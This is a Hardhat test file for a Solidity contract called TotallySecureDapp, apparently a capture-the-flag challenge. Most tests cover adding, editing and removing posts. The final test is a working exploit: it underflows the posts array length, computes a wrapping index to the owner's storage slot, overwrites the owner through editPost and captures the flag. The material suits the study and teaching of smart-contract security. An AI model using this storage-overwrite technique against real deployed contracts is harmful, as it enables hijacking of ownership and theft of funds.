import { expect } from 'chai';
import { ethers } from 'hardhat';
import type { Contract } from 'ethers';
import type { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

describe('TotallySecureDapp', () => {
    let TotallySecureDapp;
    let totallySecureDapp: Contract;
    let owner: SignerWithAddress, addr1: SignerWithAddress, addr2: SignerWithAddress;

    beforeEach(async () => {
        [owner, addr1, addr2] = await ethers.getSigners();
        TotallySecureDapp = await ethers.getContractFactory('TotallySecureDapp');
        totallySecureDapp = await TotallySecureDapp.deploy();
        await totallySecureDapp.deployed();
        await totallySecureDapp.initialize('id');
    });

    it('Should set the owner', async () => {
        expect(await totallySecureDapp._owner()).to.equal(owner.address);
    });

    it('Should not initialize again', async () => {
        await expect(totallySecureDapp.initialize('id')).to.be.revertedWith(
            'Initializable: contract is already initialized'
        );
    });

    it('Should add a new post', async () => {
        const title = 'title';
        const content = 'content';
        await expect(totallySecureDapp.addPost(title, content))
            .to.emit(totallySecureDapp, 'PostPublished')
            .withArgs(owner.address, 0);
        const post = await totallySecureDapp._posts(0);
        const author = await totallySecureDapp._authors(0);
        expect(post.title).to.equal(title);
        expect(post.content).to.equal(content);
        expect(author).to.equal(owner.address);
    });

    it('Should edit a post', async () => {
        const newTitle = 'new title';
        const newContent = 'new content';
        await totallySecureDapp.addPost('title', 'content');
        await expect(totallySecureDapp.editPost(0, newTitle, newContent))
            .to.emit(totallySecureDapp, 'PostEdited')
            .withArgs(owner.address, 0);
        const editedPost = await totallySecureDapp._posts(0);
        expect(editedPost.title).to.equal(newTitle);
        expect(editedPost.content).to.equal(newContent);
    });

    it('Should remove a post', async () => {
        await totallySecureDapp.addPost('title', 'content');
        expect(await totallySecureDapp.nPosts()).to.equal(1);
        await expect(totallySecureDapp.removePost(0))
            .to.emit(totallySecureDapp, 'PostRemoved')
            .withArgs(owner.address, 0);
    });

    it('Should only allow admins', async () => {
        const revertReason = 'Caller is not the owner';
        await expect(totallySecureDapp.captureFlag()).to.not.be.revertedWith(revertReason);
        await expect(totallySecureDapp.connect(addr1).captureFlag()).to.be.revertedWith(
            revertReason
        );
    });

    it('Should overwrite the owner admin', async () => {
        const { solidityKeccak256, hexZeroPad } = ethers.utils;
        const { BigNumber } = ethers;
        const ownerSlot = 2; // Slot of _owner in storage
        const authorsSlot = solidityKeccak256(['uint256'], [3]); // Slot of _authors in storage
        // Authors array index, acts as offset from 0th element of _authors to _owner
        // We overflow uint256 with the difference between 2^256 and 0th _authors element slot, then add the _owner slot
        const i = BigNumber.from(2).pow(256).sub(authorsSlot).add(ownerSlot);
        // Underflow the array length and make it wrap to 2^256 - 1 so we get access to all storage
        await totallySecureDapp.connect(addr1).removePost(0);
        // Ensure the underflow has worked
        expect(await totallySecureDapp.connect(addr1).nPosts()).to.equal(
            BigNumber.from(2).pow(256).sub(1)
        );
        // Overwrite _owner with our user address
        await totallySecureDapp.connect(addr1).editPost(i, 'title', 'content');
        // Verify the overwrite has succeeded
        expect(await totallySecureDapp._owner()).to.equal(addr1.address);
        expect(await owner.provider?.getStorageAt(totallySecureDapp.address, ownerSlot)).to.equal(
            hexZeroPad(addr1.address, 32).toLowerCase()
        );
        // Try to run the owner only function
        const revertReason = 'Caller is not the owner';
        await expect(totallySecureDapp.connect(addr1).captureFlag()).to.not.be.revertedWith(
            revertReason
        );
        // Flag should be captured
        expect(await totallySecureDapp.connect(addr1)._flagCaptured()).to.equal(true);
    });
});
